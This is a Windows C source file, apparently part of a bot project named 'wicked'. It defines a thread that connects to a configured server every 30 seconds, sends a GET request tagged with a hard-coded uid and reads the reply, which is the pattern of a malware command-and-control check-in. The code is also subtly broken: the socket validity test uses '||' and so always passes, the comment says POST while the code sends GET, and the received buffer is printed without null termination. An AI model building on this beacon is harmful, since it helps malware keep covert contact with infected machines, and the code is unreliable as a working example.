#include <Windows.h>
#include <stdio.h>

#include "wicked.h"
#include "config.h"
#include "http.h"
#include "socket.h"

DWORD WINAPI http_thread(LPVOID param)
{
	http_data_s http;
	char        buffer[512];
	int         r = 0;

	http.report 	 = true;
	http.report_time = 30 * 1000;

	while (http.report)
	{
		/* Connect to HTTP server */
		http.sock = create_tcp_socket(config_server->host, config_server->port);

		if (http.sock != INVALID_SOCKET || http.sock != SOCKET_ERROR)
		{
			/* Send the POST request */
			if (send_tcp_data(http.sock, "GET /%s?uid=123 HTTP/1.1\r\nHost: %s\r\n\r\n", config_server->page, config_server->host))
			{
				/* Receive request data */
				r = recv(http.sock, buffer, sizeof(buffer), 0);
				if (r >= 1)
				{
					#ifdef _DEBUG_
					printf("received http data: \n%s\n", buffer);
					#endif
				}
			}
		}

		/* Close connection */
		closesocket(http.sock);

		Sleep(http.report_time);
	}

	return 0;
}
